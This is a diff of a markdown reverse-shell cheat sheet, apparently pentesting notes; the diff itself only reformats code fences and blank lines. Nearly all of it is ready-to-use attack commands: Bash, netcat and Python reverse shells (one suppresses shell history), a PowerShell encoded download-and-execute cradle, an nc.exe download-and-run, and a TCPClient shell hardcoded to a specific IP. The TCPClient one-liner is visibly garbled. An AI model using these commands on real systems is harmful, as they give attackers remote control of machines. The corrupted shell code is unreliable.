@@ -15,46 +15,38 @@
 
 ### Bash
 
-```
+```bash
 root@kali:$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
 root@kali:$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 ```
 
-
-
 ### Netcat
 
-```
+```bash
 root@kali:$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
 ```
 
-
-
 ### Python
-
 
 #### IPv4
 
-```
+```bash
 root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
 ```
 
-
 #### IPv6
 
-```
+```bash
 root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
 ```
-
-
 
 ### PowerShell
 
 Invoke-Expression (UTF-16LE):
 
-```
+```bash
 root@kali:$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
 PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
 ```
@@ -63,7 +55,7 @@ PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
 
 Invoke-WebRequest + `nc.exe` **[1]**:
 
-```
+```bash
 PS > powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
 PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 ```
@@ -72,7 +64,7 @@ PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 
 System.Net.Sockets.TCPClient:
 
-```
+```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,ytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendbac "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
